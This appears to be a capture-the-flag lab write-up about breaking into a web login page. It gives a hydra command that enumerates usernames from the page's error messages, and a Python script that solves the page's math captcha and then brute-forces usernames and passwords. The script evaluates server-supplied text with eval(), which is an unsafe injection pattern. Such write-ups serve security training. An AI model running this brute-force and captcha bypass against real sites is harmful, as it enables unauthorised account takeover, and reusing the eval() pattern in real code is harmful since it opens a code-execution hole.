### IP

`10.10.178.173`

# Hydra

When we try to log in to the website, we can see that it says something like 
"`user <> does not exist`"

That means that, instead of trying every pair of usernames and passwords, we can first try to get the right username and the right password.

There's a simple way to do this using hydra:

`sudo hydra -L usernames.txt -p idk 10.10.178.173 http-post-form "/login:username=^USER^&password=&idk:does not exist"`

Unfortunately, it looks like after a while the website gives us an extra post form called `captcha` which provides a simple math problem for us to solve before we can actually check if the login is correct.

To solve this, I decided to write a python script using the requests library:

```python3
#!/bin/python3

import requests
import re
from time import sleep

with open('usernames.txt') as fin:
	users = [i.rstrip() for i in fin.readlines()]

with open('passwords.txt') as fin:
	pwds = [i.rstrip() for i in fin.readlines()]

url = 'http://10.10.178.173/login'

# send initial post requests a bunch of times to get captcha

data = {'username':'admin','password':'password','captcha':'0'}

for _ in range(5):
	r = requests.post(url, data=data)


working_users = []

for u in users:
	# get captcha
	html = r.text

	captcha = re.search(r'\d+ [+*-] \d+', html).group(0)

	soln = str(eval(captcha)) # kinda unsafe but welp

	data['username'] = u
	data['captcha'] = soln

	print(f'Trying user: {u}')
	r = requests.post(url, data=data)

	if('does not exist' not in r.text):
		print(u)
		print('!'*50)
		working_users.append(u)


for w in working_users: # just in case there is more than one
	print(f'Working on user: {w}')
	for p in pwds:
		html = r.text

		captcha = re.search(r'\d+ [+*-] \d+', html).group(0)

		soln = str(eval(captcha)) # kinda unsafe but welp

		data['username'] = w
		data['captcha'] = soln
		data['password'] = p
		print(f'Trying password: {p}')
		r = requests.post(url, data=data)
		if('Invalid password' not in r.text):
			print(f'{w}:{p}')
			break
```